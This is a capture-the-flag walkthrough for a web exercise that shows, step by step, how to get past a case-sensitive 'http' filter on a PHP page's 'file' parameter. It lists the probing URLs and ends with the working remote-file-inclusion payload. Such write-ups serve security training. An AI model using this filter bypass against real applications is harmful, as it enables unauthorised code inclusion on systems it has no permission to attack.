# A4 Insecure Direct Object References

1.	The task is clear! We have to load a `.php` remote file from
	`infosecistitute.com`. By clicking on `Bio` button, we can see that files
	are loaded by using the `file` parameter

		http://ctf.infosecinstitute.com/ctf2/exercises/ex4.php?file=<FILENAME>

2.	Let's try to load something from `infosecinstitute.com`

		http://ctf.infosecinstitute.com/ctf2/exercises/ex4.php?file=http://infosecinstitute.com/foo.php

	The application says

		You are trying to add a remote URL.

	It seems that some validation occurs on the value of `file` parameter. Let's
	try withouth `http:`

		http://ctf.infosecinstitute.com/ctf2/exercises/ex4.php?file=//infosecinstitute.com/foo.php

	The application says

		Invalid file selected.

	Just to be sure, let's try with

		http://ctf.infosecinstitute.com/ctf2/exercises/ex4.php?file=http

	and

		http://ctf.infosecinstitute.com/ctf2/exercises/ex4.php?file=foohttpbar

	In both cases, the result is

		You are trying to add a remote URL.

	After some other attempts, seems that `file` parameter's value is validated
	against a `regex` in order to check if `http` string is present.

3.	Now, we have to check if the `regex` is case-sesntirive. Let's try with the
	following URLs

		http://ctf.infosecinstitute.com/ctf2/exercises/ex4.php?file=HTTP://infosecinstitute.com/foo.php
		http://ctf.infosecinstitute.com/ctf2/exercises/ex4.php?file=HTTP
		http://ctf.infosecinstitute.com/ctf2/exercises/ex4.php?file=fooHTTPbar

	Relative answers are

		Invalid file selected.
		Invalid file selected.
		Invalid file selected.

	This means that we know now how to write the remote file's URL!!! :-)

4.	In the application's navbar, all the loaded files are named by following a
	shared format

		file<N>.txt

	Let's try with

		http://ctf.infosecinstitute.com/ctf2/exercises/ex4.php?file=HTTP://infosecinstitute.com/file1.txt

	The application says

		There is something else that you must do.

	In the task's description it's wrote

		[...] it must have the PHP file extension [...]

	Maybe this?

		http://ctf.infosecinstitute.com/ctf2/exercises/ex4.php?file=HTTP://infosecinstitute.com/file1.txt.php

	Yep!!! :-D

[Go to Ex3](./ex3.md) | [Go to Ex5] (./ex5.md)

